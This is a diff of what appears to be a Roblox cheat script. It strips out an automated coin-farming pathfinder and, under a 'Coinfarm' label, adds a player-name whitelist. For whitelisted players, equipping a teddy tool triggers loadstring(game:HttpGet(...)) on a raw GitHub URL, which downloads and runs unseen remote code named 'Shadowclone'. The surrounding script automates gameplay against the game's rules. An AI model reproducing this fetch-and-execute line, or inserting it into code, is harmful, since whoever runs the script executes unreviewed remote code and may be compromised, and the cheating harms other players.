@@ -220,165 +220,34 @@ end
 for _, p in ipairs(Players:GetPlayers()) do watchPlayer(p) end
 Players.PlayerAdded:Connect(watchPlayer)
 
-------------------------------------------------------------
--- Coin Pathfinding (fixed)
-------------------------------------------------------------
-local isPathfinding = false
-local currentThread = nil
+-- Coinfarm --
+local Players     = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
-local agentParams = {
-    AgentHeight   = 5,
-    AgentRadius   = 2,
-    AgentCanJump  = true,
-    AgentCanClimb = true,
+local WHITELIST = {
+    ["TheHonoredQne"]  = true,
+    ["Arsenal_Pro298"] = true,
+    ["Zedrealm298"]    = true,
+    ["Tricitiy"]       = true,
 }
 
-local function isHoldingTeddy()
-    local char = LocalPlayer.Character
-    if not char then return false end
-    for _, item in ipairs(char:GetChildren()) do
-        if item:IsA("Tool") and matchesAny(item.Name, TEDDY_KEYWORDS) then
-            return true
-        end
+local TEDDY_KEYWORDS = {"teddy", "bear", "plush", "stuffed"}
+
+local function matchesAny(name, keywords)
+    local lower = string.lower(name)
+    for _, kw in ipairs(keywords) do
+        if string.find(lower, kw) then return true end
     end
     return false
-end
-
-local function findNearestCoin()
-    local char = LocalPlayer.Character
-    if not char then return nil end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp then return nil end
-
-    local nearest, nearestDist = nil, math.huge
-
-    local function searchFolder(parent)
-        local ok, children = pcall(function() return parent:GetChildren() end)
-        if not ok then return end
-        for _, obj in ipairs(children) do
-            if matchesAny(obj.Name, COIN_KEYWORDS) and obj:IsA("BasePart") then
-                local dist = (hrp.Position - obj.Position).Magnitude
-                if dist < nearestDist then
-                    nearest = obj
-                    nearestDist = dist
-                end
-            end
-            if #obj:GetChildren() > 0 then
-                searchFolder(obj)
-            end
-        end
-    end
-
-    searchFolder(workspace)
-    return nearest
-end
-
-local function moveToCoin(coin)
-    local char = LocalPlayer.Character
-    if not char then return end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hrp or not hum then return end
-
-    local path = PathfindingService:CreatePath(agentParams)
-    local ok = pcall(function()
-        path:ComputeAsync(hrp.Position, coin.Position)
-    end)
-
-    if not ok or path.Status ~= Enum.PathStatus.Success then
-        -- fallback: walk directly
-        hum:MoveTo(coin.Position)
-        task.wait(0.5)
-        return
-    end
-
-    local waypoints = path:GetWaypoints()
-
-    for i, waypoint in ipairs(waypoints) do
-        if not isPathfinding then return end
-        if not isHoldingTeddy() then return end
-        if not coin or not coin.Parent then return end -- coin collected, exit immediately
-
-        -- Jump waypoint
-        if waypoint.Action == Enum.PathWaypointAction.Jump then
-            hum.Jump = true
-            task.wait(0.1)
-        end
-
-        hum:MoveTo(waypoint.Position)
-
-        local timeout   = 2.5
-        local elapsed   = 0
-        local stuckTime = 0
-        local lastPos   = hrp.Position
-
-        while elapsed < timeout do
-            if not isPathfinding then return end
-            if not coin or not coin.Parent then return end -- coin collected mid-path
-
-            local dist = (hrp.Position - waypoint.Position).Magnitude
-            if dist <= WAYPOINT_REACHED_DIST then break end
-
-            -- Stuck detection: if barely moved in 0.5s, jump
-            local moved = (hrp.Position - lastPos).Magnitude
-            if moved < 0.5 then
-                stuckTime += 0.1
-                if stuckTime >= 0.5 then
-                    hum.Jump = true
-                    stuckTime = 0
-                end
-            else
-                stuckTime = 0
-            end
-
-            lastPos  = hrp.Position
-            elapsed += task.wait(0.1)
-        end
-    end
-end
-
-local function startPathfinding()
-    isPathfinding = true
-    print("[Pathfinding] Started — heading to nearest coin")
-    while isPathfinding and isHoldingTeddy() do
-        local coin = findNearestCoin()
-        if coin then
-            moveToCoin(coin)
-        else
-            print("[Pathfinding] No coins found")
-            task.wait(1)
-        end
-        -- No extra wait here — loop immediately recalculates after each coin
-    end
-    isPathfinding = false
-    print("[Pathfinding] Stopped")
-end
-
-local function stopPathfinding()
-    isPathfinding = false
-    if currentThread then
-        task.cancel(currentThread)
-        currentThread = nil
-    end
-    local char = LocalPlayer.Character
-    if char then
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        local hrp = char:FindFirstChild("HumanoidRootPart")
-        if hum and hrp then hum:MoveTo(hrp.Position) end
-    end
 end
 
 local function watchToggle(char)
     char.ChildAdded:Connect(function(item)
         if item:IsA("Tool") and matchesAny(item.Name, TEDDY_KEYWORDS) then
-            if not isPathfinding then
-                currentThread = task.spawn(startPathfinding)
+            if WHITELIST[LocalPlayer.Name] then
+                print("[Shadowclone] Activating...")
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Tricitiy/Shadowclone/main/Sitting"))()
             end
-        end
-    end)
-    char.ChildRemoved:Connect(function(item)
-        if item:IsA("Tool") and matchesAny(item.Name, TEDDY_KEYWORDS) then
-            stopPathfinding()
         end
     end)
 end
